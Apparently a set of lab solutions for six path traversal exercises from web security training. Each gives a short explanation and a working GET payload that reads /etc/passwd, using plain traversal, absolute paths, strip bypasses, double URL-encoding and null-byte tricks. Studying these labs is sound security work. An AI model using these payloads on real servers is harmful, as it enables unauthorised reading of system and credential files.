# Path Traversal

### LAB: File path traversal, simple case
This lab contains a path traversal vulnerability in the `GET` request to the  product images: 

    GET /image?filename=../../../etc/passwd

### LAB: File path traversal, traversal sequences blocked with absolute path bypass
Same as above lab but the application blocks traversal sequences. Instead it treats the supplied filename as being relative to a default working directory. Use absolute path to bypass that:

    GET /image?filename=/etc/passwd

### LAB: File path traversal, traversal sequences stripped non-recursively
The application strips path traversal sequences from the user-supplied filename before using it. So `....//` would be stripped to `../` which is a valid path traversal sequence:

    GET /image?filename=....//....//....//etc/passwd

### LAB: File path traversal, traversal sequences stripped with superfluous URL-decode
The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it. Double-encode `../../../etc/passwd` to bypass this:

    GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34

### LAB: File path traversal, validation of start of path
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. Use path traversal to bypass that:

    GET /image?filename=/var/www/images/../../../etc/passwd

### LAB: File path traversal, validation of file extension with null byte bypass
The application validates that the supplied filename ends with the expected file extension. Use null bytes (`%00`) to satisfy that and also ignore it when traversing path:

    GET /image?filename=../../../etc/passwd%00.jpg
